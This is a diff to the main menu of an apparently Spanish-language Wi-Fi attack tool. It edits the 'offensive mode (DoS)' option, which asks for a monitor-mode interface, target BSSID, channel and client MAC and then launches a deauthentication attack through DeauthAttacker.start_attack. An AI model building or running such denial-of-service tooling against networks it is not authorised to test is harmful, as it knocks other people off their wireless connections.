@@ -135,7 +135,7 @@ def main():
             print("\n[*] MODO OFENSIVO (DoS) SELECCIONADO")
             interfaz = input("[>] Introduce tu interfaz en modo monitor (ej. wlan0mon): ")
             bssid = input("[>] Introduce el BSSID (MAC) del objetivo (ej. AA:BB:CC:DD:EE:FF): ")
-            canal = input("[>] Introduce el canal del objetivo (1-13): ")
+            canal = input("[>] Introduce el canal del objetivo (ej. 1-13 o 36-165): ")
             
             if canal.isdigit():
                 print(f"[*] Fijando la interfaz {interfaz} en el canal {canal}...")
@@ -144,8 +144,12 @@ def main():
             else:
                 print("[\033[93m!\033[0m] Advertencia: Canal no válido. El ataque fallará si no estás en el canal correcto.")
             
+            cliente = input(f"[>] Introduce MAC del cliente (Enter para usar BC:6E:E2:39:79:C5): ")
+            if not cliente.strip():
+                cliente = "BC:6E:E2:39:79:C5"
+                
             # Lanzamos el ataque
-            DeauthAttacker.start_attack(interface=interfaz, bssid=bssid, client="BC:6E:E2:39:79:C5")
+            DeauthAttacker.start_attack(interface=interfaz, bssid=bssid, client=cliente)
             input("\n[Pausa] Pulsa Enter para volver al menú principal...")
 
         elif opcion == '4':
